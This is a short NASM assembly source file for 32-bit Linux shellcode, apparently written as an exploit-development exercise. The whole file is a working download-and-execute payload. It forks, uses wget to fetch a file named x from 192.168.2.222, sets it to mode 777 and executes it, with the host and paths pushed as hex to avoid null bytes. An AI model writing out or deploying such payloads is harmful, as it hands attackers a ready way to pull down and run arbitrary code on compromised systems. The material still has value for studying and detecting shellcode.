; Filename: downloadexec.nasm
; Author: Daniel Sauder
; Website: http://wp.me/p4fGy5-34
; Tested on: Ubuntu 12.04 / 32Bit
; License http://creativecommons.org/licenses/by-sa/3.0/

; Shellcode:
; - download 192.168.2.222/x with wget
; - chmod x
; - execute x
; - x is an executable

global _start

section .text

_start:

	;fork
	xor eax,eax
	mov al,0x2
	int 0x80
	xor ebx,ebx
	cmp eax,ebx
	jz child
  
	;wait(NULL)
	xor eax,eax
	mov al,0x7
	int 0x80
		
	;chmod x
	xor ecx,ecx
	xor eax, eax
	push eax
	mov al, 0xf
	push 0x78
	mov ebx, esp
	xor ecx, ecx
	mov cx, 0x1ff
	int 0x80
	
	;exec x
	xor eax, eax
	push eax
	push 0x78
	mov ebx, esp
	push eax
	mov edx, esp
	push ebx
	mov ecx, esp
	mov al, 11
	int 0x80
	
child:
	;download 192.168.2.222//x with wget
	push 0xb
	pop eax
	cdq
	push edx
	
	push 0x782f2f32	;2//x avoid null byte
	push 0x32322e32 ;22.2
	push 0x2e383631 ;.861
	push 0x2e323931 ;.291
	mov ecx,esp
	push edx
	
	push 0x74 ;t
	push 0x6567772f ;egw/
	push 0x6e69622f ;nib/
	push 0x7273752f ;rsu/
	mov ebx,esp
	push edx
	push ecx
	push ebx
	mov ecx,esp
	int 0x80
	